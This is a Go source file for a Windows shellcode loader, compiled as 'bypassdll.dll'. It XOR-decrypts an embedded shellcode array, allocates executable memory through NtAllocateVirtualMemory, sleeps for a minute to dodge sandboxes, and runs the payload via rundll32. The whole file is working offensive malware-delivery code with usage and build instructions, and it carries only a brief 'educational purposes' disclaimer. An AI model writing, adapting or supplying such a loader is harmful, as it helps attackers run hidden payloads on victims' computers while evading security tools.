/*
Title: Dynamic Shellcode Loader
Author: Krptyk
Version: 0.0.1
 
Description:
This script is a Go implementation of a dynamic shellcode loader for Windows. It is designed to decrypt and execute encrypted shellcode in memory, leveraging Windows API functionalities to allocate memory, set appropriate permissions, and finally execute the shellcode via utilising rundll32.exe with an insertion point of ExecuteShellcode.
 
Usage:
1. Replace "SHELLCODE HERE" with your encrypted shellcode in the "encryptedShellcode" array.
2. Adjust the "key" variable to match the key used to encrypt the shellcode.
3. Compile the Go script using the appropriate flags to generate a Windows compatible binary or DLL.
4. Execute the compiled binary/DLL to run the shellcode in a Windows environment. e.g rundll32.exe bypassdll.dll,ExecuteShellcode
 
Security Warning:
This is intended for educational and research purposes only. Utilize it responsibly and ethically, adhering to legal guidelines and consented environments. The creator assumes no responsibility for misuse or any potential damage arising from the use of this script.
 
Compilation:
Recommended compilation command (suitable for Windows):
CC=x86_64-w64-mingw32-gcc GOOS=windows GOARCH=amd64 CGO_ENABLED=1 go build -buildmode=c-shared -o bypassdll.dll bypassdll.go
 
Change Log:
- Version 0.0.1: Initial version with basic functionalities of decrypting and executing encrypted shellcode in memory.
 
*/
 
 
package main
 
// #cgo windows CFLAGS: -D_WIN32
// #cgo windows LDFLAGS: -lntdll
// #include <windows.h>
// #include <stdlib.h>
import "C"
 
import (
    "fmt"
    "syscall"
    "time"
    "unsafe"
)
 
const (
    MEM_COMMIT             = 0x1000
    PAGE_EXECUTE_READWRITE = 0x40
)
 
var (
    ntdll                       = syscall.NewLazyDLL("ntdll.dll")
    procNtAllocateVirtualMemory = ntdll.NewProc("NtAllocateVirtualMemory")
)
 
func xorDecrypt(shellcode []byte, key byte) {
    for i := range shellcode {
        shellcode[i] ^= key
    }
}
 
func allocate(size uintptr) (addr uintptr, err error) {
    zero := uintptr(0)
    r1, _, e1 := procNtAllocateVirtualMemory.Call(uintptr(^uintptr(0)), uintptr(unsafe.Pointer(&zero)), uintptr(0), uintptr(unsafe.Pointer(&size)), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
    if r1 != 0 {
        err = e1
    }
    addr = zero
    return
}
 
//export ExecuteShellcode
func ExecuteShellcode() {
    // Encrypted shellcode
    encryptedShellcode := []byte{/* SHELLCODE HERE*/} // Replace with your encrypted shellcode
 
    // XOR decryption key
    key := byte(/*ADD YOUR ENCRYPTION KEY HERE*/) // XOR decryption key
 
    // Decrypt the shellcode
    xorDecrypt(encryptedShellcode, key)
 
    // Allocate memory with READWRITE permission
    addr, err := allocate(uintptr(len(encryptedShellcode)))
    if err != nil {
        panic(fmt.Sprintf("Failed to allocate memory: %v", err))
    }
 
    // Copy the decrypted shellcode into the allocated memory - change the amount as necessary
    copy((*[250000]byte)(unsafe.Pointer(addr))[:], encryptedShellcode)
 
    // Wait 1 minute before executing the shellcode
    time.Sleep(60 * time.Second)
 
    // Convert the address to a function pointer and call it
    funcPtr := syscall.NewCallback(func() uintptr {
        // Execute the shellcode
        syscall.Syscall(addr, 0, 0, 0, 0)
        return 0
    })
    syscall.Syscall(funcPtr, 0, 0, 0, 0)
}
 
func main() {}
